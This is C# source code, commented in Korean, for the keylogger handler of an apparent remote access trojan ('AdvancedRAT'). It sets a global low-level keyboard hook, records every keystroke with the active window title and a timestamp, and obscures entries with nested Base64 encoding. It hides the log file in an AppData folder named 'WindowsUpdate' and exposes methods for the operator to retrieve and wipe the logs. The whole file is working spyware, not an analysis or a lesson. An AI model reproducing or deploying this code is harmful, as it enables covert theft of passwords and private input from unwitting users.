using System;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;

namespace AdvancedRAT.Client.Handlers
{
    /// <summary>
    /// 고급 키로거 핸들러
    /// - 창 제목별 분류
    /// - 날짜/시간별 분류  
    /// - Base64 인코딩 저장
    /// - RTF 형식 파일
    /// </summary>
    public class AdvancedKeyloggerHandler
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        
        private IntPtr hookId = IntPtr.Zero;
        private LowLevelKeyboardProc proc;
        private bool isRunning = false;
        
        private string logFilePath;
        private string lastWindowTitle = "";
        private List<string> logBuffer = new List<string>();
        private const int BUFFER_SIZE = 100;
        
        public AdvancedKeyloggerHandler()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string logDir = Path.Combine(appData, "WindowsUpdate");
            Directory.CreateDirectory(logDir);
            logFilePath = Path.Combine(logDir, "keylogger.rtf");
        }
        
        public async Task<object> Start()
        {
            try
            {
                if (isRunning)
                {
                    return new { success = false, message = "Keylogger already running" };
                }
                
                proc = HookCallback;
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
                
                isRunning = true;
                return new { success = true, message = "Advanced keylogger started" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Stop()
        {
            try
            {
                if (!isRunning)
                {
                    return new { success = false, message = "Keylogger not running" };
                }
                
                UnhookWindowsHookEx(hookId);
                isRunning = false;
                
                // 남은 버퍼 저장
                SaveBuffer();
                
                return new { success = true, message = "Keylogger stopped" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetLogs()
        {
            try
            {
                // 버퍼 저장
                SaveBuffer();
                
                if (!File.Exists(logFilePath))
                {
                    return new { success = true, logs = "", path = "", data = "", format = "rtf_base64" };
                }
                
                // 파일 읽기
                string fileContent = File.ReadAllText(logFilePath);
                
                // 호환 형식으로 반환
                string pathB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(logFilePath));
                string dataB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(fileContent));
                
                return new
                {
                    success = true,
                    logs = fileContent,
                    path = pathB64,
                    data = dataB64,
                    format = "rtf_base64"
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> NewLog()
        {
            try
            {
                if (File.Exists(logFilePath))
                {
                    File.Delete(logFilePath);
                }
                logBuffer.Clear();
                lastWindowTitle = "";
                
                return new { success = true, message = "Log file reset" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> DeleteLog()
        {
            try
            {
                if (File.Exists(logFilePath))
                {
                    File.Delete(logFilePath);
                }
                logBuffer.Clear();
                lastWindowTitle = "";
                
                return new { success = true, message = "Log file deleted" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                try
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    
                    // 현재 활성 창 제목 가져오기
                    string currentWindow = GetActiveWindowTitle();
                    
                    // 창이 바뀌면 새로운 섹션 시작
                    if (!string.IsNullOrEmpty(currentWindow) && currentWindow != lastWindowTitle)
                    {
                        lastWindowTitle = currentWindow;
                        // 새로운 창 제목 기록 (키 입력 없이)
                        LogEntry(currentWindow, "");
                    }
                    
                    // 키 입력 기록
                    Keys key = (Keys)vkCode;
                    string keyString = GetKeyString(key);
                    
                    if (!string.IsNullOrEmpty(keyString))
                    {
                        LogEntry(currentWindow, keyString);
                    }
                    
                    // 버퍼가 가득 차면 저장
                    if (logBuffer.Count >= BUFFER_SIZE)
                    {
                        SaveBuffer();
                    }
                }
                catch { }
            }
            
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
        
        private void LogEntry(string windowTitle, string key)
        {
            try
            {
                // 형식: Base64(Title|DateTime|Key)
                string title = windowTitle ?? "";
                string dateTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string keyValue = key ?? "";
                
                // 각 필드를 Base64로 인코딩
                string titleB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(title));
                string dateTimeB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(dateTime));
                string keyB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(keyValue));
                
                // 전체 엔트리를 Base64로 인코딩
                string entry = $"{titleB64}|{dateTimeB64}|{keyB64}";
                string entryB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(entry));
                
                logBuffer.Add(entryB64);
            }
            catch { }
        }
        
        private void SaveBuffer()
        {
            try
            {
                if (logBuffer.Count == 0) return;
                
                // 파일에 추가
                File.AppendAllLines(logFilePath, logBuffer);
                logBuffer.Clear();
            }
            catch { }
        }
        
        private string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder buff = new StringBuilder(nChars);
                IntPtr handle = GetForegroundWindow();
                
                if (GetWindowText(handle, buff, nChars) > 0)
                {
                    return buff.ToString();
                }
            }
            catch { }
            
            return "";
        }
        
        private string GetKeyString(Keys key)
        {
            return key switch
            {
                Keys.Space => " ",
                Keys.Enter => "[ENTER]",
                Keys.Back => "[BACK]",
                Keys.Tab => "[TAB]",
                Keys.Escape => "[ESC]",
                Keys.LShiftKey or Keys.RShiftKey => "",  // Shift는 기록 안 함
                Keys.LControlKey or Keys.RControlKey => "[CTRL]",
                Keys.LMenu or Keys.RMenu => "[ALT]",
                Keys.Capital => "[CAPS]",
                Keys.Delete => "[DEL]",
                Keys.Home => "[HOME]",
                Keys.End => "[END]",
                Keys.Prior => "[PGUP]",
                Keys.Next => "[PGDN]",
                Keys.Left => "[LEFT]",
                Keys.Right => "[RIGHT]",
                Keys.Up => "[UP]",
                Keys.Down => "[DOWN]",
                Keys.F1 => "[F1]",
                Keys.F2 => "[F2]",
                Keys.F3 => "[F3]",
                Keys.F4 => "[F4]",
                Keys.F5 => "[F5]",
                Keys.F6 => "[F6]",
                Keys.F7 => "[F7]",
                Keys.F8 => "[F8]",
                Keys.F9 => "[F9]",
                Keys.F10 => "[F10]",
                Keys.F11 => "[F11]",
                Keys.F12 => "[F12]",
                Keys.Insert => "[INS]",
                Keys.PrintScreen => "[PRTSC]",
                Keys.Scroll => "[SCRLK]",
                Keys.Pause => "[PAUSE]",
                Keys.NumLock => "[NUMLK]",
                Keys.LWin or Keys.RWin => "[WIN]",
                _ => key.ToString().Length == 1 ? key.ToString() : $"[{key}]"
            };
        }
    }
}
